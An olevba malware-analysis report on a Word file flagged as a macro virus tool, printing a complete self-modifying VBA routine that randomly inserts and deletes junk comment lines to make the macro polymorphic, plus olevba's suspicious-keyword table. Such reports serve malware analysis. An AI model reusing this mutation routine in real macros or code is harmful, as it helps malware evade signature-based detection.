olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.SOPS.b-bea04b90c895d2f5cb32c43032fb6f8e6e531e9f
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: SPS.DOC - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SPS.bas 
in file: SPS.DOC - OLE stream: 'Macros/VBA/SPS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub SomePolymorphicSystem()
Randomize
AktuelleZeilenAnzahl = Application.VBE.ActiveVBProject.VBComponents("SPS").CodeModule.CountOfLines
If AktuelleZeilenAnzahl > 76 Then
    Kleiner = Int(Rnd * (AktuelleZeilenAnzahl - 26))
        For ii = 1 To AktuelleZeilenAnzahl
            If Left(Application.VBE.ActiveVBProject.VBComponents("SPS").CodeModule.Lines(ii, 1), 3) = "Rem" Then
                Application.VBE.ActiveVBProject.VBComponents("SPS").CodeModule.DeleteLines ii
                x = x + 1
                If x = Kleiner Then Exit For
            End If
        Next
Else
PolySize = Int(Rnd * 10) + 1
    For PolyMorphic = 1 To PolySize
        PolyString = ""
        PolyLines = Application.VBE.ActiveVBProject.VBComponents("SPS").CodeModule.CountOfLines
        RndLine = Int(Rnd * PolyLines) + 1
        StringSize = Int(Rnd * 39) + 1
            For SomeString = 1 To StringSize
                PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
            Next SomeString
        Application.VBE.ActiveVBProject.VBComponents("SPS").CodeModule.InsertLines RndLine, "Rem " & PolyString
    Next PolyMorphic
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

